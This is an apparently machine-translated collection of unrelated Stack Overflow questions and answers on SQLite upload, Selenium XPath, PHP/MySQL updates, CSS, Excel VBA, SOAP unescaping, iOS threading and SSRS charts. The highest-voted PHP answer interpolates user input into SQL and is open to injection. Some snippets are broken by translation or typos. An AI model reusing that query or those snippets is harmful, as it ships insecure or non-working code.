“批量”传输的一种简单方法是从 SQLite 数据库中提取您需要保存的数据，并将其放入 JSON 或 XML 对象中，该对象将在服务器上解释为纬度/经度数据的集合。这会将整个上传放入单个 Web 服务调用中，而不必遍历您的“最新”记录并为每个项目调用 Web 服务。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-12T17:22:31.140

而不是将数据库发送到服务器，您应该有一种机制，可以只导出数据并将其发送到数据库。

您可以将数据导出为 CSV 文件或任何其他格式，然后将其发送到服务器，以便服务器可以轻松读取该 CSV 并将该数据插入数据库。

您还可以阅读您的 SQLite 数据库，然后您可以制作 XML、JSON 等结构化数据。然后您可以连接到网络服务，然后将结构化文件发送到服务器。

如果您有很多数据并且想要将其发送到服务器，那么 CSV 是最佳选择。

# button - 需要 xpath 来定位 2 个具有几乎相同属性的按钮，以便在 Selenium 自动化脚本中使用

> ID：10114729
> 
> 赞同：0
> 
> 时间：2012-04-11T22:14:06.853
> 
> 标签：button, xpath, selenium, selenium-webdriver

这两个按钮的 ID 几乎相似（ID 上的数字可能会改变，因此不可靠） 两者都有相同的类 它们都位于同一个父级下 除了跨度没有什么不同

我试图在 Using Selenium 上定位和构建事件的应用程序的所有 UI 元素都类似于下面的部分......

谁能建议我如何使用 xpath 找到这些按钮？

```
<div id="button-1749" class="x-btn x-box-item x-toolbar-item x-btn-default-toolbar-  small x-noicon x-btn-noicon x-btn-default-toolbar-small-noicon x-item-disabled x-disabled x-btn-disabled x-btn-default-toolbar-small-disabled" style="margin: 0pt; left: 1563px; top: 0px;">
<em id="button-1749-btnWrap" class="">
<button id="button-1749-btnEl" class="x-btn-center" autocomplete="off" role="button"    hidefocus="true" type="button" aria-disabled="true" disabled="">
<span id="button-1749-btnInnerEl" class="x-btn-inner" style="">Delete Selected</span>
<span id="button-1749-btnIconEl" class="x-btn-icon x-hide-display">&nbsp;</span>
</button>
</em>
</div>
<div id="button-1750" class="x-btn x-box-item x-toolbar-item x-btn-default-toolbar-small x-noicon x-btn-noicon x-btn-default-toolbar-small-noicon" style="margin: 0pt; left: 1654px; top: 0px;">
<em id="button-1750-btnWrap" class="">
<button id="button-1750-btnEl" class="x-btn-center" autocomplete="off" role="button"    tabindex="1" hidefocus="true" type="button">
<span id="button-1750-btnInnerEl" class="x-btn-inner" style="">New Title</span>
<span id="button-1750-btnIconEl" class="x-btn-icon x-hide-display">&nbsp;</span>
</button>
</em>
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T01:51:37.603

我认为这应该适用于您的情况：

```
locator = driver.find_element_by_xpath("//div/em/button/span[contains(text(),'Delete Selected')]") 
```

如果是另一个元素，您可以执行类似的方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-12T01:03:00.067

如果要查找特定 div 下的元素，可以使用`descendent`axis.

例子：

```
//div[@id='your div']/descendant::button[contains(@class, 'x-btn-center')]/span[text()='Delete Selected']" 
```

这将为您提供 id 为“您的 div”的 div 中的已删除选定按钮。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T23:58:29.130

您还可以使用 GetElements（与 GetElement 相反），这将返回与您的搜索条件匹配的元素列表。然后，如果按钮出现在页面上的顺序永远不会改变，您可以使用此列表通过使用关联的索引每次访问您想要的按钮。

例如。

```
ReadOnlyCollection<IWebElement> buttons = driver.FindElements(By.XPath("YOUR XPATH HERE"));
//If it's the 3rd button that matches your criteria
buttons[2].Click(); //or whatever you want with this button :) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-12T02:20:22.193

尽管根据您的问题，xpath 是所需的定位器，但 xpath 和 css 选择器之间存在速度差异，这是一个示例：[http ://saucelabs.com/blog/index.php/2011/05/why-css-locators-are -the-way-to-go-vs-xpath/](http://saucelabs.com/blog/index.php/2011/05/why-css-locators-are-the-way-to-go-vs-xpath/)。要通过 css 选择器定位这些元素，请使用以下 python 示例

```
els = driver.find_elements_by_css_selector("button[id^=button]
for eachel in els:
   eachel.click() 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-05-18T17:38:42.227

如果 2 个元素的 xpath 相同，则必须创建自己的 xpath

```
driver.findElement(By.xpath("//span[contains(text),'New Title')]")).click; 
```

# php - 使用 MySQL 更新一行数据

> ID：10114730
> 
> 赞同：0
> 
> 时间：2012-04-11T22:14:11.177
> 
> 标签：php, mysql

我希望所有用户都能够更新他们的关于页面。这是我在 php 中用于查询 MySQL 更新的字符串。我收到一个错误。我究竟做错了什么？

```
$insert_query= "UPDATE user_info SET bio= $bio_ans, residence= $residence_ans, work=   
$work_ans WHERE user_id= $user_id";
mysqli_query($connect, $insert_query)
    or die('error with query1'); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T22:15:40.427

如果更新值不是整数，则需要在值周围使用引号。

```
 $insert_query= "UPDATE user_info 
                   SET bio= '$bio_ans', 
                   residence= '$residence_ans', 
                   work = '$work_ans' WHERE user_id= '$user_id'";
mysqli_query($connect, $insert_query)
or die('error with query1'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T22:25:56.550

除了缺少引号（如[RPM](https://stackoverflow.com/a/10114750/11649)所示）之外，您正在做的真正错误的事情是使用变量插值来创建 SQL 查询。

这仅适用于数字变量，并且仅当您在使用前将其强制转换为数字类型时才可接受。字符串转义据说是安全的，但很容易出错（重复两次，添加新值时忘记添加等）。稍有不慎就会为 SQL 注入打开一个巨大的漏洞，这绝对是破解 Web 应用程序的最简单方法。

使用带有参数绑定的准备好的语句，你会很安全。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T22:17:29.850

```
$insert_query= "UPDATE user_info SET bio= $bio_ans, residence= $residence_ans, work=$work_ans WHERE user_id= $user_id";
mysqli_query($connect, $insert_query)
    or die('error: $mysqli->error'); 
```

它将让您具体`$mysqli->error`知道出了什么问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-11T22:18:06.123

$insert_query=“更新用户信息集生物='”。$bio_ans。"', 住所='" 。$residence_ans."', work=
'".$work_ans."' WHERE user_id= '$user_id'"; mysqli_query($connect, $insert_query) 或 die('query1 错误');

# css - 绝对定位和左右浮动

> ID：10114733
> 
> 赞同：2
> 
> 时间：2012-04-11T22:14:36.373
> 
> 标签：css, css-float, css-position

这显然是矛盾的。我需要的是让两个子元素位于父元素的左右边缘，同时垂直居中并覆盖在所有其他兄弟元素上。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-11T22:18:32.313

你可以使用`left`and `right`。

```
.child
{
    position: absolute;
    top: 50%;
}

.child .left
{
    left: 0;
}

.child .right
{
    right: 0;
} 
```

这`top: 50%`会将孩子的上边缘与父母的中间对齐。如果您的父级具有恒定大小，请使用像素大小。否则，您可能需要一些 javascript 才能使其完全正确。

**编辑以回应评论：**

要使其相对于父级而不是页面，您需要给父级`position: relative;`，它会起作用。默认位置是`static`，并且不适用于此。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T22:21:19.107

如果我理解正确：

```
<div class="parent" style="position:absolute;height:70%;width:70%;top:15%;left:15%;background-color:#eee;border:solid blue 1px;">
    <div class="left" style="position:absolute;width:30%;height:70%;top:15%;left:0%;background-color:black;z-index:20;">left box vertically aligned</div>

    <div class="right" style="position:absolute;width:30%;height:70%;top:15%;left:70%;background-color:black;z-index:20;">right box vertically aligned</div>
</div>​ 
```

见：http: [//jsfiddle.net/dankpiff/zmYEf/](http://jsfiddle.net/dankpiff/zmYEf/)

如果您将下面的元素设置为较低的 z-index，它们将被“左”和“右”框覆盖

你是这个意思吗？

# excel - 突出显示完整的重复行（不是单个值）

> ID：10114734
> 
> 赞同：2
> 
> 时间：2012-04-11T22:14:40.517
> 
> 标签：excel, vba

我查看了其他几个堆栈溢出问题，但是我没有找到我正在寻找的答案。

我有一个 25000 行的 excel 表，格式如下：

```
userid  |  taskid  |  taskcode
 1      |     3    |     K
 1      |     4    |     O
 1      |     4    |     L
 1      |     5    |     O
 2      |     3    |     O 
```

我想要做的是识别任何重复考虑的行，`userid`并且`taskid`在上面的示例中，我希望突出显示第二行和第三行。

我不确定它有多可行，理想情况下，我想识别包含`taskcode` `O`而不是`L`.

我的最终目标是使用 taskcode O 删除所有重复的 userid / taskid 行，无论它是如何实现的（突出显示然后按突出显示或使用 vba 排序）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T22:53:52.650

好的，在搞砸后解决了它-除非有更有效的方法，否则我将把这个答案留在这里以供将来参考。

**步骤1**

在 D 列中使用`userid`和`taskid`值创建一个组合单元格。`=A2&B2`

**第2步**

使用内置条件格式突出显示重复项。

**第 3 步**

使用顶部突出显示的重复红色突出显示的单元格进行自定义排序，然后按`taskcode`选择的自定义顺序（O、K、L）对

**第4步**

只需突出显示您要删除的所有行（现在在块中）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-16T07:55:50.300

如果你想尝试使用 VBA。

```
Sub duplicates_separation()

      Dim duplicate(), i As Long
        Dim delrange As Range, cell As Long
        Dim delrange2 As Range
        Dim shtIn As Worksheet
        Dim numofrows1

          Set shtIn = ThisWorkbook.Sheets("sheet1")

        x = 2
        y = 1

        Set delrange = shtIn.Range("c1:b30000")  'set your range here
       Set delrange2 = shtIn.Range("b1:f30000")
       ReDim duplicate(0)
    'search duplicates in 2nd column
        For cell = 1 To delrange.Cells.Count
            If Application.CountIf(delrange, delrange(cell)) > 1 Then
                ReDim Preserve duplicate(i)
                duplicate(i) = delrange(cell).Address
                i = i + 1
            End If
        Next
    'search duplicates in 3rd column
        For cell = 1 To delrange2.Cells.Count
            If Application.CountIf(delrange2, delrange2(cell)) > 1 Then
                ReDim Preserve duplicate(i)
                duplicate(i) = delrange2(cell).Address
                i = i + 1
            End If
        Next

            'print duplicates

        For i = UBound(duplicate) To LBound(duplicate) Step -1
        shtIn.Range(duplicate(i)).EntireRow.Value.delete
        x = x + 1
    Next i

    End Sub 
```

# java - Unescape _xHHHH_ JAVA 中的 XML 转义序列 (SOAPMessage)

> ID：10114736
> 
> 赞同：0
> 
> 时间：2012-04-11T22:14:47.457
> 
> 标签：java, xml, escaping

我从 Web 服务收到以下 SOAP 响应。

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" >
<SOAP-ENV:Header>
</SOAP-ENV:Header>
<SOAP-ENV:Body>
<cxmla:ExecuteResponse xmlns:cxmla="urn:schemas-microsoft-com:xml-analysis">
  <cxmla:return>
    <root xmlns="urn:schemas-microsoft-com:xml-analysis:rowset" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:EX="urn:schemas-microsoft-com:xml-analysis:exception">
      <xsd:schema xmlns:xsd="http://www.w3.org/2001/XMLSchema" targetNamespace="urn:schemas-microsoft-com:xml-analysis:rowset" xmlns="urn:schemas-microsoft-com:xml-analysis:rowset" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:sql="urn:schemas-microsoft-com:xml-sql" elementFormDefault="qualified">
        <xsd:element name="root">
          <xsd:complexType>
            <xsd:sequence>
              <xsd:element maxOccurs="unbounded" minOccurs="0" name="row" type="row"/>
            </xsd:sequence>
          </xsd:complexType>
        </xsd:element>
        <xsd:simpleType name="uuid">
          <xsd:restriction base="xsd:string">
            <xsd:pattern value="[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}"/>
          </xsd:restriction>
        </xsd:simpleType>
        <xsd:complexType name="row">
          <xsd:sequence>
            <xsd:element minOccurs="0" name="_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Funding_x0020_Entity_x005d_._x005b_MEMBER_CAPTION_x005d_" sql:field="[TRD.New Hierarchy 0].[Funding Entity].[MEMBER_CAPTION]" type="xsd:string"/>
            <xsd:element minOccurs="0" name="_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Program_x005d_._x005b_MEMBER_CAPTION_x005d_" sql:field="[TRD.New Hierarchy 0].[Program].[MEMBER_CAPTION]" type="xsd:string"/>
            <xsd:element minOccurs="0" name="_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Currency_x005d_._x005b_MEMBER_CAPTION_x005d_" sql:field="[TRD.New Hierarchy 0].[Currency].[MEMBER_CAPTION]" type="xsd:string"/>
            <xsd:element minOccurs="0" name="_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Term_x005d_._x005b_MEMBER_CAPTION_x005d_" sql:field="[TRD.New Hierarchy 0].[Term].[MEMBER_CAPTION]" type="xsd:string"/>
            <xsd:element minOccurs="0" name="_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Sequence_x0020_Number_x005d_._x005b_MEMBER_CAPTION_x005d_" sql:field="[TRD.New Hierarchy 0].[Sequence Number].[MEMBER_CAPTION]" type="xsd:string"/>
            <xsd:element minOccurs="0" name="_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Rate_x005d_._x005b_MEMBER_CAPTION_x005d_" sql:field="[TRD.New Hierarchy 0].[Rate].[MEMBER_CAPTION]" type="xsd:string"/>
            <xsd:element minOccurs="0" name="_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Outstanding_x0020_Total_x005d_._x005b_MEMBER_CAPTION_x005d_" sql:field="[TRD.New Hierarchy 0].[Outstanding Total].[MEMBER_CAPTION]" type="xsd:string"/>
            <xsd:element minOccurs="0" name="_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Sales_x0020_Total_amt_x005d_._x005b_MEMBER_CAPTION_x005d_" sql:field="[TRD.New Hierarchy 0].[Sales Total_amt].[MEMBER_CAPTION]" type="xsd:string"/>
            <xsd:element minOccurs="0" name="_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Yield_x0020_Pct_rate_x005d_._x005b_MEMBER_CAPTION_x005d_" sql:field="[TRD.New Hierarchy 0].[Yield Pct_rate].[MEMBER_CAPTION]" type="xsd:string"/>
            <xsd:element minOccurs="0" name="_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Counterparty_x005d_._x005b_MEMBER_CAPTION_x005d_" sql:field="[TRD.New Hierarchy 0].[Counterparty].[MEMBER_CAPTION]" type="xsd:string"/>
            <xsd:element minOccurs="0" name="_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Account_x005d_._x005b_MEMBER_CAPTION_x005d_" sql:field="[TRD.New Hierarchy 0].[Account].[MEMBER_CAPTION]" type="xsd:string"/>
            <xsd:element minOccurs="0" name="_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Contact_x005d_._x005b_MEMBER_CAPTION_x005d_" sql:field="[TRD.New Hierarchy 0].[Contact].[MEMBER_CAPTION]" type="xsd:string"/>
            <xsd:element minOccurs="0" name="_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Cusip_x0020_Num_x005d_._x005b_MEMBER_CAPTION_x005d_" sql:field="[TRD.New Hierarchy 0].[Cusip Num].[MEMBER_CAPTION]" type="xsd:string"/>
            <xsd:element minOccurs="0" name="_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Price_x0020_Amt_x005d_._x005b_MEMBER_CAPTION_x005d_" sql:field="[TRD.New Hierarchy 0].[Price Amt].[MEMBER_CAPTION]" type="xsd:string"/>
            <xsd:element minOccurs="0" name="_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Payoff_x0020_Amt_x005d_._x005b_MEMBER_CAPTION_x005d_" sql:field="[TRD.New Hierarchy 0].[Payoff Amt].[MEMBER_CAPTION]" type="xsd:string"/>
            <xsd:element minOccurs="0" name="_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_maturitydt_x005d_._x005b_MEMBER_CAPTION_x005d_" sql:field="[TRD.New Hierarchy 0].[maturitydt].[MEMBER_CAPTION]" type="xsd:string"/>
            <xsd:element minOccurs="0" name="_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Key_x0020_Date_x005d_._x005b_MEMBER_CAPTION_x005d_" sql:field="[TRD.New Hierarchy 0].[Key Date].[MEMBER_CAPTION]" type="xsd:string"/>
            <xsd:element minOccurs="0" name="_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Custodian_x005d_._x005b_MEMBER_CAPTION_x005d_" sql:field="[TRD.New Hierarchy 0].[Custodian].[MEMBER_CAPTION]" type="xsd:string"/>
            <xsd:element minOccurs="0" name="_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Int_x0020_Disc_x0020_Amt_x005d_._x005b_MEMBER_CAPTION_x005d_" sql:field="[TRD.New Hierarchy 0].[Int Disc Amt].[MEMBER_CAPTION]" type="xsd:string"/>
            <xsd:element minOccurs="0" name="_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_IPA_x0020_code_x005d_._x005b_MEMBER_CAPTION_x005d_" sql:field="[TRD.New Hierarchy 0].[IPA code].[MEMBER_CAPTION]" type="xsd:string"/>
            <xsd:element minOccurs="0" name="_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Settlement_x0020_Status_x005d_._x005b_MEMBER_CAPTION_x005d_" sql:field="[TRD.New Hierarchy 0].[Settlement Status].[MEMBER_CAPTION]" type="xsd:string"/>
            <xsd:element minOccurs="0" name="_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Source_x0020_Code_x005d_._x005b_MEMBER_CAPTION_x005d_" sql:field="[TRD.New Hierarchy 0].[Source Code].[MEMBER_CAPTION]" type="xsd:string"/>
            <xsd:element minOccurs="0" name="_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Trade_x0020_ID_x005d_._x005b_MEMBER_CAPTION_x005d_" sql:field="[TRD.New Hierarchy 0].[Trade ID].[MEMBER_CAPTION]" type="xsd:string"/>
            <xsd:element minOccurs="0" name="_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Trade_x0020_Type_x005d_._x005b_MEMBER_CAPTION_x005d_" sql:field="[TRD.New Hierarchy 0].[Trade Type].[MEMBER_CAPTION]" type="xsd:string"/>
            <xsd:element minOccurs="0" name="_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Branch_x005d_._x005b_MEMBER_CAPTION_x005d_" sql:field="[TRD.New Hierarchy 0].[Branch].[MEMBER_CAPTION]" type="xsd:string"/>
            <xsd:element minOccurs="0" name="_x005b_Measures_x005d_._x005b_RATE_x005d_" sql:field="[Measures].[RATE]"/>
          </xsd:sequence>
        </xsd:complexType>
      </xsd:schema>
          <row>
        <_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Funding_x0020_Entity_x005d_._x005b_MEMBER_CAPTION_x005d_>FSC</_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Funding_x0020_Entity_x005d_._x005b_MEMBER_CAPTION_x005d_>
        <_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Program_x005d_._x005b_MEMBER_CAPTION_x005d_>FSCUS3A3</_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Program_x005d_._x005b_MEMBER_CAPTION_x005d_>
        <_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Currency_x005d_._x005b_MEMBER_CAPTION_x005d_>USD</_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Currency_x005d_._x005b_MEMBER_CAPTION_x005d_>
        <_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Term_x005d_._x005b_MEMBER_CAPTION_x005d_>2</_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Term_x005d_._x005b_MEMBER_CAPTION_x005d_>
        <_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Sequence_x0020_Number_x005d_._x005b_MEMBER_CAPTION_x005d_>70</_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Sequence_x0020_Number_x005d_._x005b_MEMBER_CAPTION_x005d_>
        <_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Rate_x005d_._x005b_MEMBER_CAPTION_x005d_>0.140000000000000000</_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Rate_x005d_._x005b_MEMBER_CAPTION_x005d_>
        <_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Outstanding_x0020_Total_x005d_._x005b_MEMBER_CAPTION_x005d_>34000000.0000</_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Outstanding_x0020_Total_x005d_._x005b_MEMBER_CAPTION_x005d_>
        <_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Sales_x0020_Total_amt_x005d_._x005b_MEMBER_CAPTION_x005d_>33998942.2200</_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Sales_x0020_Total_amt_x005d_._x005b_MEMBER_CAPTION_x005d_>
        <_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Yield_x0020_Pct_rate_x005d_._x005b_MEMBER_CAPTION_x005d_>0.140004000000000000</_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Yield_x0020_Pct_rate_x005d_._x005b_MEMBER_CAPTION_x005d_>
        <_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Counterparty_x005d_._x005b_MEMBER_CAPTION_x005d_>MLAM</_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Counterparty_x005d_._x005b_MEMBER_CAPTION_x005d_>
        <_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Account_x005d_._x005b_MEMBER_CAPTION_x005d_>RAT         </_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Account_x005d_._x005b_MEMBER_CAPTION_x005d_>
        <_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Contact_x005d_._x005b_MEMBER_CAPTION_x005d_>Jones, Richard</_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Contact_x005d_._x005b_MEMBER_CAPTION_x005d_>
        <_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Cusip_x0020_Num_x005d_._x005b_MEMBER_CAPTION_x005d_>74432KT32   </_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Cusip_x0020_Num_x005d_._x005b_MEMBER_CAPTION_x005d_>
        <_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Price_x0020_Amt_x005d_._x005b_MEMBER_CAPTION_x005d_>99.996888882353000000</_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Price_x0020_Amt_x005d_._x005b_MEMBER_CAPTION_x005d_>
        <_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Payoff_x0020_Amt_x005d_._x005b_MEMBER_CAPTION_x005d_>34000000.0000</_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Payoff_x0020_Amt_x005d_._x005b_MEMBER_CAPTION_x005d_>
        <_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_maturitydt_x005d_._x005b_MEMBER_CAPTION_x005d_>06-03-2011</_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_maturitydt_x005d_._x005b_MEMBER_CAPTION_x005d_>
        <_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Key_x0020_Date_x005d_._x005b_MEMBER_CAPTION_x005d_>Jun  1 2011 12:00AM</_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Key_x0020_Date_x005d_._x005b_MEMBER_CAPTION_x005d_>
        <_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Custodian_x005d_._x005b_MEMBER_CAPTION_x005d_>00005170    </_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Custodian_x005d_._x005b_MEMBER_CAPTION_x005d_>
        <_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Int_x0020_Disc_x0020_Amt_x005d_._x005b_MEMBER_CAPTION_x005d_>1057.7800</_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Int_x0020_Disc_x0020_Amt_x005d_._x005b_MEMBER_CAPTION_x005d_>
        <_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_IPA_x0020_code_x005d_._x005b_MEMBER_CAPTION_x005d_>CITI        </_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_IPA_x0020_code_x005d_._x005b_MEMBER_CAPTION_x005d_>
        <_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Settlement_x0020_Status_x005d_._x005b_MEMBER_CAPTION_x005d_>N </_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Settlement_x0020_Status_x005d_._x005b_MEMBER_CAPTION_x005d_>
        <_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Source_x0020_Code_x005d_._x005b_MEMBER_CAPTION_x005d_>MN          </_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Source_x0020_Code_x005d_._x005b_MEMBER_CAPTION_x005d_>
        <_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Trade_x0020_ID_x005d_._x005b_MEMBER_CAPTION_x005d_>20111520000070</_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Trade_x0020_ID_x005d_._x005b_MEMBER_CAPTION_x005d_>
        <_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Trade_x0020_Type_x005d_._x005b_MEMBER_CAPTION_x005d_>US3A3CP     </_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Trade_x0020_Type_x005d_._x005b_MEMBER_CAPTION_x005d_>
        <_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Branch_x005d_._x005b_MEMBER_CAPTION_x005d_>US          </_x005b_TRD.New_x0020_Hierarchy_x0020_0_x005d_._x005b_Branch_x005d_._x005b_MEMBER_CAPTION_x005d_>
        <_x005b_Measures_x005d_._x005b_RATE_x005d_ xsi:type="xsd:double">0.14</_x005b_Measures_x005d_._x005b_RATE_x005d_>
      </row>
    </root>
  </cxmla:return>
</cxmla:ExecuteResponse>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope> 
```

我试图取消标签中使用的*xHHHH*以取回值。我正在使用 SAAJ 库进行 SOAP 处理。除了编写用于反向转义的代码之外，我还有哪些选择。

最好的，罗汉

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T16:01:42.680

好吧，我实现了一个方法来做到这一点。但我仍然想知道任何库中是否有标准可以做到这一点。

```
 private Pattern s_hexPattern = Pattern.compile("_x([A-Fa-f0-9]{4})_"); 
  public String convertHexToString ( String str ) {

    Matcher m = s_hexPattern.matcher(str);
    while ( m.find() ){
        int decimal = Integer.parseInt(m.group(1), 16);
        str = str.replace(m.group() , (char)decimal + "" ) ;
    }

    return str;
    } 
```

最好的，罗汉

# objective-c - 属性/字段线程同步

> ID：10114737
> 
> 赞同：0
> 
> 时间：2012-04-11T22:14:50.003
> 
> 标签：objective-c, ios

我在ios sdk上阅读了一些关于多线程的东西，但我仍然没有找到问题的答案：在主线程中我有一个属性，程序在一个线程中做了一些事情，其中​​属性的值被改变了，另一个线程需要改变的值。那么如何在一个线程中更改属性或字段的值，以便所有线程都更改？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T22:55:28.707

更改单个对象的属性基本上会更改“所有线程”的值。除非您自己制作对象，否则没有特定于线程的对象副本。

对于多线程程序，主要挑战是确保两个线程不会同时尝试访问/写入相同的内存（在您的情况下是属性）。为您的财产执行此操作的最简单方法（但不一定是最有效或万无一失的方法）是从您的财产声明中排除“非原子”属性。（编辑：这假设您正在使用`@synthesize`来实现您的属性，并且没有`@dynamic`自定义覆盖 getter 或 setter。）

多线程是一个有点大的话题，但 Apple 的文档是了解更多信息的好地方：http: [//developer.apple.com/library/ios/#documentation/Cocoa/Conceptual/Multithreading/简介/Introduction.html](http://developer.apple.com/library/ios/#documentation/Cocoa/Conceptual/Multithreading/Introduction/Introduction.html)

# oracle - 在一份报告中隐藏一些图表并显示其他图表

> ID：10114738
> 
> 赞同：0
> 
> 时间：2012-04-11T22:14:53.093
> 
> 标签：oracle, reporting-services, charts, ssrs-2008

我有一份包含 24 个图表的报告，一天中的每个小时一个。用户可以根据下拉菜单选择显示一个、几个或所有图表。下拉列表与允许多个值的参数相关联。见下文：

[![无标题](../Images/11c95670cbd867a2740ed5afada33613.png)](http://www.flickr.com/photos/76579226@N04/7068967911/ "Flickr 上的 ____________BOb 未命名")

问题是，如果用户从下拉列表中选择一个或几个小时，所有图表都会显示，并且选择的图表提供数据，而其他人则说“没有可用的数据”。

目前对于每个图表，如果在下拉列表中选择了值，我添加了以下内容以显示数据：

```
=Switch(Parameters!HOURINPUT.Value(0) = "0", false) 
```

有没有办法隐藏用户没有从下拉列表中选择的图表？

隐藏图表并仅查看选择的图表比在其中显示“无可用数据”的空白框看起来更好。

**更新：**

不止一个参数。

